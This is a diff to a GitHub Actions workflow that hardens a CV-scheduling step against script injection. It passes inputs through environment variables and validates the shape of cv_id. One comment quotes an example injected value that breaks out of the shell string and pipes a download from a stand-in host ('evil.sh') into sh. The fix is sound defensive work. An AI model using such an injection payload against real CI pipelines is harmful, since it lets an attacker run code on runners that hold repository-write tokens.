@@ -94,13 +94,26 @@ jobs:
 
       - name: Decide which CVs are due
         id: due
+        # Through env, not "${{ }}" inside the script. Interpolation happens
+        # before bash ever sees the line, so a dispatch with cv_id set to
+        # `x"; curl evil.sh | sh; #` would run as shell on a runner holding a
+        # repo-write token. The dashboard validates the id, but the workflow is
+        # dispatchable by anything holding the PAT and must not trust its caller.
+        env:
+          IN_FORCE: ${{ inputs.force }}
+          IN_CV_ID: ${{ inputs.cv_id }}
         run: |
           set -euo pipefail
-          if [ "${{ inputs.force }}" = "true" ]; then
+          if [ "${IN_FORCE:-}" = "true" ]; then
             DUE=$(python scripts/cv_schedule.py \
               --profiles scout/profiles.json --runs-dir "$STATE_DIR/runs" --all-enabled)
-          elif [ -n "${{ inputs.cv_id }}" ]; then
-            DUE="${{ inputs.cv_id }}"
+          elif [ -n "${IN_CV_ID:-}" ]; then
+            # Shape-checked here too: this id becomes a path under scout/profiles/
+            # and the dashboard is not the only possible caller.
+            case "$IN_CV_ID" in
+              *[!a-z0-9-]*|"") echo "::error::invalid cv_id"; exit 1 ;;
+            esac
+            DUE="$IN_CV_ID"
           else
             DUE=$(python scripts/cv_schedule.py \
               --profiles scout/profiles.json --runs-dir "$STATE_DIR/runs")
